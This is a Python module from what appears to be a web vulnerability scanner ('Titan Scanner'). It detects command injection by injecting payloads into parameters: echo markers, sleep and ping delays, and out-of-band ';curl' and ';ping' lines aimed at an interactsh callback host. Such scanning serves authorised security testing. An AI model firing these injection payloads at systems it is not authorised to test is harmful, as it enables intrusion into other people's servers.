"""Command injection / RCE detection module for Titan Scanner."""

from __future__ import annotations

import asyncio
import random
import string
import time
from typing import Any, Dict, List, Optional
from urllib.parse import urlparse

from titan.core.models import Finding, Severity, AttackType
from titan.verify import BaselineAnalyzer, BlindDetector
from titan.verify.oracles import extract_error_classes, score_signals


class RCEDetector:
    def __init__(self, payload_smith, fingerprint: Dict[str, Any]):
        self.payload_smith = payload_smith
        self.fingerprint = fingerprint
        self.blind_detector = BlindDetector(samples=3, confidence=0.95)
        self.interactsh = fingerprint.get("interactsh")

    async def scan(self, context, target: str, method: str, url: str, params: Dict[str, str]) -> List[Finding]:
        findings: List[Finding] = []

        cmd_params = [p for p in params if any(k in p.lower() for k in ["cmd", "command", "exec", "execute", "run", "system", "shell", "bash", "ping", "nslookup", "curl", "wget", "eval", "function", "callback", "url", "path", "file", "template", "include", "host", "ip", "target"])]
        if not cmd_params:
            return findings

        context_data = {
            "fingerprint": self.fingerprint,
            "attack_type": "rce",
            "param_type": "command",
            "location": "query" if method == "GET" else "body",
        }
        base_payloads = self.payload_smith.get_base_payloads("rce", context_data)[:6]
        waf = self.payload_smith.detect_waf({}, "", 0) or self.fingerprint.get("waf", "unknown")
        if waf and waf != "unknown":
            base_payloads.extend(self.payload_smith.get_waf_bypass_payloads(base_payloads[:3], waf)[:3])
        # Time-based payloads: most RCE endpoints are blind (no output reflection).
        base_payloads = base_payloads + ["; sleep 4", "| ping -n 3 127.0.0.1", "&& ping -n 3 127.0.0.1"]
        payloads = list(dict.fromkeys(base_payloads))[:8]

        for param_name in cmd_params[:3]:
            finding = await self._test_param(context, target, method, url, param_name, params, payloads)
            if finding:
                findings.append(finding)

        return findings

    async def _request(self, context, method: str, url: str, params: Dict[str, str], target: str):
        headers = {"Referer": target}
        if method == "GET":
            return await context.request.get(url, params=params, headers=headers, timeout=3000)
        return await context.request.post(url, data=params, headers=headers, timeout=3000)

    async def _test_param(self, context, target, method, url, param_name, all_params, payloads) -> Optional[Finding]:
        baseline_body = ""
        baseline_status = None
        baseline_times: List[float] = []

        try:
            for _ in range(3):
                start = time.monotonic()
                r = await self._request(context, method, url, all_params, target)
                baseline_times.append(time.monotonic() - start)
                if not baseline_body:
                    baseline_body = await r.text()
                    baseline_status = r.status
        except Exception:
            pass

        # Reflection oracle: a unique marker echoed back proves command execution.
        marker = "".join(random.choices(string.ascii_letters + string.digits, k=8))
        marker_payloads = [
            f";echo {marker}", f"&echo {marker}", f"|echo {marker}",
            f"&&echo {marker}", f"`echo {marker}`",
        ]

        oob_url = None
        if self.interactsh:
            try:
                oob_url = self.interactsh.generate_oob_url("rce")
            except Exception:
                pass

        all_test_payloads = list(dict.fromkeys(payloads + marker_payloads))
        # Timing-oracle budget: at most 2 runs per param. On a non-vulnerable
        # target, every sleep/ping payload × 3 samples would burn the module
        # budget (and trip the engine's per-module timeout / 3-strike counter).
        timing_runs = 0

        for payload in all_test_payloads:
            try:
                test_params = dict(all_params)
                test_params[param_name] = payload
                resp = await self._request(context, method, url, test_params, target)
                body = await resp.text()

                signals: List[str] = []
                diffs = BaselineAnalyzer.diff_responses(baseline_body, body, payload)

                # Marker reflection is the *proof* of execution. We deliberately
                # do NOT treat generic payload reflection as evidence here:
                # apps that echo the query string would false-positive.
                #
                # IMPORTANT: reflection only counts if the body shows no other
                # backend-sink error.  If extract_error_classes finds a
                # filesystem/sql/xml error, the marker is inside a diagnostic
                # echo (e.g. "No such file or directory: ';echo MARKER'"), not
                # genuine shell output.
                if marker in body and not extract_error_classes(body):
                    signals.append("reflection")
                    diffs.append("rce:marker_reflected")

                # Command-output fingerprints in the body — direct evidence.
                # (Deliberately restricted to strong, unambiguous signatures.)
                rce_content_indicators = [
                    "uid=", "gid=", "groups=", "root:", "daemon:",
                    "phpinfo()", "directory of", "volume serial",
                ]
                content_matches = [ind for ind in rce_content_indicators if ind in body.lower()]
                if content_matches:
                    signals.append("content_leak")
                    for m in content_matches:
                        diffs.append(f"rce:{m}")

                # Error classes — only sinks that belong to a *shell* eval
                # context.  A filesystem error means the parameter reached
                # open(), not system() — that evidence belongs to LFI.
                ALLOWED = {"generic", "python", "java"}
                for error_class in extract_error_classes(body):
                    if error_class in ALLOWED:
                        signals.append(f"error:{error_class}")
                        diffs.append(f"rce:error_class:{error_class}")

                if resp.status >= 500:
                    signals.append("status_500")
                if len(body) != len(baseline_body):
                    signals.append("content_change")

                # Timing oracle only on delay-capable payloads (sleep/ping),
                # capped at `timing_runs < 2` so a clean target can't burn the
                # module budget (see the cap above).
                is_blind, blind_time = False, 0.0
                if timing_runs < 2 and any(k in payload.lower() for k in ["sleep", "ping -n", "ping -c"]):
                    timing_runs += 1
                    is_blind, blind_time = await self.blind_detector.detect_time_based(
                        context, url, method, test_params, {}, {"Referer": target},
                        payload, "query", baseline_times, param_name=param_name,
                    )
                if is_blind:
                    signals.append("time_delay")
                    diffs.append(f"time_delay:{blind_time:.1f}s")

                if signals:
                    confidence, verified, _ = score_signals(signals)
                    if confidence >= 0.3:
                        severity = Severity.CRITICAL if verified else Severity.HIGH
                        return Finding(
                            target=target,
                            url=str(resp.url or url),
                            method=method.upper(),
                            param=param_name,
                            location="query" if method == "GET" else "body",
                            payload=payload,
                            attack_type=AttackType.RCE,
                            severity=severity,
                            verified=verified,
                            confidence=confidence,
                            status=resp.status,
                            headers=dict(resp.headers),
                            body=body[:2000],
                            diffs=diffs,
                            baseline_body=baseline_body[:2000],
                            baseline_status=baseline_status,
                            verification_body=body[:2000],
                            verification_status=resp.status,
                        )
            except Exception:
                continue

        # OOB phase: confirm blind execution via interactsh DNS/HTTP callback.
        if oob_url and self.interactsh:
            try:
                await self.interactsh.register()
                oob_host = urlparse(oob_url).netloc
                oob_payloads = [
                    f";ping {oob_host}", f"|ping {oob_host}", f"`ping {oob_host}`",
                    f";curl {oob_url}", f"|curl {oob_url}",
                ]
                for oob_payload in oob_payloads:
                    try:
                        test_params = dict(all_params)
                        test_params[param_name] = oob_payload
                        await self._request(context, method, url, test_params, target)
                    except Exception:
                        continue
                await asyncio.sleep(2)
                oob_results = await self.interactsh.poll(timeout=10)
                if oob_results:
                    return Finding(
                        target=target,
                        url=url,
                        method=method.upper(),
                        param=param_name,
                        location="query" if method == "GET" else "body",
                        payload=f"OOB RCE: {oob_url}",
                        attack_type=AttackType.RCE,
                        severity=Severity.CRITICAL,
                        verified=True,
                        confidence=0.95,
                        status=200,
                        headers={},
                        body="",
                        diffs=["rce:oob_confirmed"],
                        baseline_body=baseline_body[:2000],
                        baseline_status=baseline_status,
                        verification_body="OOB interaction confirmed",
                        verification_status=200,
                    )
            except Exception:
                pass

        return None
